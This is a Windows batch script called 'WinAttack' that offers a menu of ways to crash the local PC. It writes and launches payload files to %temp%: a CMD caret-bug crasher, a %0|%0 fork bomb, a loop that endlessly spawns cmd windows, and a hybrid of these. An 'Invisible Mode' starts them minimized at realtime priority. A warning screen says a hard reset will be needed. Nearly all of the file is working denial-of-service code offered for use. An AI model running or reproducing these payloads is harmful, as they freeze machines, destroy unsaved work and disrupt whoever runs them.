@echo off
::::::::::::::::::::::
:: Booting Proccess ::
::::::::::::::::::::::

color f0
if "%appfolder%" == "" set "Appfolder=%cd%"
if "%status%" == "" set "status=Signed Out"
pushd "%AppFolder%"
set "On=þ"
set "Off= "
set "ec=<nul set /p ="
set "switch=call :Switch"
set "Set /p=call:AskString"
set "clr=call :color"
%switch% switch1 off
%switch% switch2 off
%switch% switch3 off
%switch% switch4 off
%switch% switch5 off
set "WinTitle=HACKED! BY [XLR8]"
::::::::::::::::::::::::
:: WinAttack Homepage ::
::::::::::::::::::::::::
::::::::::
:WinAttack
::::::::::
cls
title WinAttack [App By XLR8] - SD-Security©
echo ÛÛÛßßßßßßßßßßßßßÛÛÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
echo þþþ SD-Security þþþ                    WinAttack                     %status%
echo ÛÛÛÜÜÜÜÜÜÜÜÜÜÜÜÜÛÛÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo    Û              Û Attack Time Û    Attack Method     Û Time Before OS Freeze
echo ÛßßÛßßßßßßßßßßßßßßÛßßßßßßßßßßßßßÛßßßßßßßßßßßßßßßßßßßßßßÛßßßßßßßßßßßßßßßßßßßßßßß
echo Û1%switch1%Û  Crash OS V1 Û 15 Seconds  Û  Uses CMD Caret Bug  Û 10 Sec Abort Time
echo Û2%switch2%Û  Crash OS V2 Û 17 Seconds  Û      Fork Bomb       Û 08 Sec Abort Time
echo Û3%switch3%Û  Crash OS V3 Û 09 Seconds  Û Multiple CMD Windows Û 02 Sec Abort Time
echo Û4%switch4%Û  Crash OS V4 Û 05 Seconds  Û þ WinAttack Hybrid þ Û 00 Sec Abort Time
echo Û5%switch5%Û  Invisible Mode
echo Û6ÛÛ  Change WinAttack Window Title
%ec% Û7ÛÛ  &%clr% CF "INITIATE ATTACK"&echo.
echo Û8ÛÛ  Back
CHOICE /C 12345678 /N /M "Ûþ "
IF ERRORLEVEL 8 goto :end
IF ERRORLEVEL 7 goto :Initiate
IF ERRORLEVEL 6 call :ChangeWinTitle
IF ERRORLEVEL 5 %switch% switch5&goto :WinAttack
IF ERRORLEVEL 4 %switch% switch4&goto :WinAttack
IF ERRORLEVEL 3 %switch% switch3&goto :WinAttack
IF ERRORLEVEL 2 %switch% switch2&goto :WinAttack
IF ERRORLEVEL 1 %switch% switch1&goto :WinAttack
goto :WinAttack
:: Change The Window Title
:ChangeWinTitle
echo  Choose A Window Title For The WinAttack CMD Window:
%set /p% "WinTitle=Ûþ "
goto :EOF

:: Initiate The Chosen Attack(s)
:Initiate
mode con: lines=19
cls
echo.
echo  ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
echo  Û               Û               Û Û   THIS ATTACK WILL MAKE THIS PC CRASH,   Û
echo  Û              ÛÛÛ              Û Û     So Save Any Unsaved Work Before      Û
echo  Û             ÛÛÛÛÛ             Û Û  Advancing. Perform This Attack At YOUR  Û
echo  Û            ÛÛÛÛÛÛÛ            Û Û  OWN RISK! In Order To Get Control Over  Û
echo  Û           ÛÛÛßßßÛÛÛ           Û Û This PC, You Will Have To Hard-Reset It. Û
echo  Û          ÛÛÛÛ   ÛÛÛÛ          Û Û ---------------------------------------- Û
echo  Û         ÛÛÛÛÛ   ÛÛÛÛÛ         Û Û  TO PERFORM A HARD RESET, Hold Down The  Û
echo  Û        ÛÛÛÛÛÛ   ÛÛÛÛÛÛ        Û Û    Power Button On This PC For A Few     Û
echo  Û       ÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛ       Û Û      Seconds, Then Reboot Normally.      Û
echo  Û      ÛÛÛÛÛÛÛÛÜÜÜÛÛÛÛÛÛÛÛ      Û ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
echo  Û     ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ     Û Û                                          Û
echo  Û    ÛÛÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛÛ    Û Û If You Accept This And Want To Continue, Û
echo  Û   ÛÛÛÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛÛÛ   Û Û          -PRESS ANY KEY 5 TIMES-         Û
echo  Û  ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ  Û Û           ~~~~~~~~~~~~~~~~~~~~~          Û
echo  Û ßßßßßßßßßßßßßßßßßßßßßßßßßßßßß Û Û                                          Û
echo  ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
pause >nul
color f7
pause >nul
color f8
pause >nul
color 70
pause >nul
color 80
pause >nul
color 0C
pushd %temp%
if exist "WinAttack*.bat" del /F /Q WinAttack*.bat >nul 2>&1
if "%Switch5%" == "%on%" (set "Start=start /min /realtime "%WinTitle%"") else (set "Start=start /realtime "%WinTitle%"")
if "%Switch1%" == "%on%" (call :Method1&set WinAttackCMD1=%Start% "WinAttack1.bat") else (set "WinAttackCMD1=")
if "%Switch2%" == "%on%" (call :Method2&set WinAttackCMD2=%Start% "WinAttack2.bat") else (set "WinAttackCMD2=")
if "%Switch3%" == "%on%" (call :Method3&set WinAttackCMD3=%Start% "WinAttack3.bat") else (set "WinAttackCMD3=")
if "%Switch4%" == "%on%" (call :Method4&set WinAttackCMD4=%Start% "WinAttack4.bat") else (set "WinAttackCMD4=")
%WinAttackCMD1%
%WinAttackCMD2%
%WinAttackCMD3%
%WinAttackCMD4%
popd
timeout 10 >nul
goto :end

:: WinAttack Method 1 -CMD Caret Bug-
:Method1
(%ec% ^^ nul ^<^^)> "WinAttack1.bat"
goto :EOF

:: WinAttack Method 2 -Fork Bomb-
:Method2
(echo @title %WinTitle%
echo %%0^|%%0
)> "WinAttack2.bat"
goto :EOF

:: WinAttack Method 3 -CMD Windows-
:Method3
(echo ^@echo off
echo title %WinTitle%
echo :Fork
echo %Start% cmd^&%Start% %%0^&%Start% cmd
echo goto Fork
)> "WinAttack3.bat"
goto :EOF

:: WinAttack Method 4 -WinAttack Hybrid-
:Method4
call :Method1
(echo ^@echo off
echo title -WINATTACK HYBRID- %WinTitle%
echo %Start% WinAttack1.bat
echo :Fork
echo %Start% cmd^&%Start% %%0^&%Start% %%0
echo goto :Fork)> "WinAttack4.bat"
goto :EOF


::::::::::::::::::::::::::
:: : SD-Security APIs : ::
::::::::::::::::::::::::::
::::::::::::::::::::::::::::
:: SD-Security Switch API ::
::::::::::::::::::::::::::::
:Switch
::::::::::::::::::::::::::::
set "SwitchName=%~1"
set "SwitchType=%~2"
if "%SwitchType%" == "" (call :InvertSwitch&goto :EOF)
if /i "%switchType%" == "ON" (set "%SwitchName%=%ON%") else (if /i "%switchType%" == "OFF" set "%SwitchName%=%Off%")
goto :EOF
:InvertSwitch
for /f "tokens=1-2 delims==" %%a in ('set %SwitchName% 2^>nul') do set "SwitchStatus=%%b">nul 2>&1
if "%SwitchStatus%" == "%Off%" (set "%SwitchName%=%ON%") else (set "%SwitchName%=%OFF%")
goto :EOF

:: SD-Security Color API
:Color
if not exist "C:\windows\system32\findstr.exe" (<nul set /p "=%~2"&goto :EOF)
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & for %%b in (1) do rem"') do (set "DEL=%%a")
pushd %temp%
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1
popd
goto :EOF

:: SD-Security Input Securer API
:AskString
set "StringName=%*"
set "StringName=%StringName:"=%"
set /p %StringName%
for /f "tokens=1" %%a in ('echo %StringName%') do set "StringName=%%a"&goto AskStringNext
:AskStringNext
(set %StringName% 2>nul|findstr /r /c:"[&|<>""]"&if not errorlevel 1 (set "%StringName%="&1>&2 echo Do Not Enter Special Characters!&goto :AskString)) 1>nul
(set %StringName% 2>nul|findstr "Environment variable %StringName% not defined"&if errorlevel 1 (set "%StringName%="&1>&2 echo Do Not Leave This Field Blank!&goto :AskString)) 1>nul
goto :EOF
:CheckString
set "StringName=%*"
(set %StringName% 2>nul|findstr /r /c:"[&|<>""]"&if not errorlevel 1 (set "%StringName%="&goto :EOF)) 1>nul
(set %StringName% 2>nul|findstr "Environment variable %StringName% not defined"&if errorlevel 1 (set "%StringName%="&goto :EOF)) 1>nul
goto :EOF


:end
popd